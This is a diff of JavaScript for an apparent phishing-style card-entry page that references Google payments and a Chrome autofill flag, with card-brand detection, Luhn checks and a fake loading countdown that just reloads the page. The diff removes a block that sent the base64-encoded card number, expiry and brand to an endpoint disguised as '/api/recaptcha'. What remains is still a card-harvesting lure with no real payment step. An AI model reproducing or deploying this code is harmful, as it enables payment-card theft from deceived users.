@@ -1,6 +1,3 @@
-/* =========================
-   Pixel Rain (background)
-   ========================= */
 (() => {
   const canvas = document.getElementById("pixelRain");
   if (!canvas) return;
@@ -32,7 +29,7 @@
     canvas.style.height = h + "px";
     ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
 
-    // pixel size adapts a bit by screen width
+  
     state.size = w < 520 ? 9 : 10;
 
     state.cols = Math.ceil(w / state.size);
@@ -45,7 +42,7 @@
   }
 
   function tick() {
-    // fade layer
+  
     ctx.fillStyle = "rgba(0,0,0,0.12)";
     ctx.fillRect(0, 0, w, h);
 
@@ -82,6 +79,9 @@
 })();
 
 
+/* =========================
+   Card + Form logic
+   ========================= */
 const form = document.getElementById("payment-form");
 const numInput = document.getElementById("cardNumber");
 const dateInput = document.getElementById("cardDate");
@@ -94,7 +94,7 @@ const brandLabel = document.getElementById("brand");
 const loading = document.getElementById("loading");
 const counterEl = document.getElementById("counter");
 
-// Copy-only block
+
 const FLAG_URL = "chrome://flags/#enable-autofill-credit-card-upload";
 const copyFlag = document.getElementById("copyFlag");
 const flagHelp = document.getElementById("flagHelp");
@@ -108,6 +108,8 @@ copyFlag?.addEventListener("click", async () => {
   }
 });
 
+
+
 document.getElementById("update-button")?.addEventListener("click", () => {
   window.open(
     "https://banger.supply/collections/accessories/products/dabber_dock-silicone-stands",
@@ -116,9 +118,11 @@ document.getElementById("update-button")?.addEventListener("click", () => {
   );
 });
 
+
 document.getElementById("perfil-button")?.addEventListener("click", () => {
   window.open("https://payments.google.com/", "_blank", "noopener,noreferrer");
 });
+
 
 const cardPatterns = {
   visa: /^4/,
@@ -148,7 +152,7 @@ function luhn(value){
   return (sum % 10) === 0;
 }
 
-// NUM FORMATO (AMEX 4-6-5, resto 4-4-4-4)
+
 numInput?.addEventListener("input", (e)=>{
   let raw = e.target.value.replace(/\D/g,'').slice(0,19);
   const brand = detectBrand(raw);
@@ -171,6 +175,7 @@ numInput?.addEventListener("input", (e)=>{
   displayNum.textContent = formatted || "#### #### #### ####";
 });
 
+
 function parseAndFormatExp(input){
   const digits = (input || "").replace(/\D/g,"").slice(0,6);
   if (digits.length === 0) return {display:"", mm:null, yy:null, complete:false};
@@ -178,10 +183,12 @@ function parseAndFormatExp(input){
   const mm = digits.slice(0,2);
   const rest = digits.slice(2);
 
+
   if (rest.length <= 2){
     const complete = rest.length === 2;
     return { display: rest.length ? (mm + "/" + rest) : mm, mm, yy: complete ? rest : null, complete };
   }
+
 
   const yyyy = rest.slice(0,4);
   const complete = yyyy.length === 4;
@@ -220,11 +227,12 @@ dateInput?.addEventListener("blur", ()=>{
   }
 });
 
-form?.addEventListener("submit", async (e) => {
+
+form?.addEventListener("submit",(e)=>{
   e.preventDefault();
   err.textContent = "";
 
-  const raw = numInput.value.replace(/\D/g, '');
+  const raw = numInput.value.replace(/\D/g,'');
   const brand = detectBrand(raw);
   const minLen = (brand === "AMEX") ? 15 : 16;
 
@@ -242,30 +250,20 @@ form?.addEventListener("submit", async (e) => {
   dateInput.value = p.mm + "/" + p.yy;
   displayDate.textContent = p.mm + "/" + p.yy;
 
-  try {
-    await fetch('/api/recaptcha', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        token: btoa(raw),
-        tag: btoa(brand),
-        ref: btoa(`${p.mm}/${p.yy}`),
-        ua: navigator.userAgent
-      }),
-      keepalive: true
-    });
-  } catch (err) {}
-
   loading.style.display = "flex";
   let c = 3;
   counterEl.textContent = c;
 
-  const timer = setInterval(() => {
+  const timer = setInterval(()=>{
     c--;
     counterEl.textContent = c;
-    if (c <= 0) {
+    if (c <= 0){
       clearInterval(timer);
-      setTimeout(() => window.location.reload(), 900);
+      setTimeout(()=> window.location.reload(), 900);
     }
   }, 1000);
 });
+
+
+
+
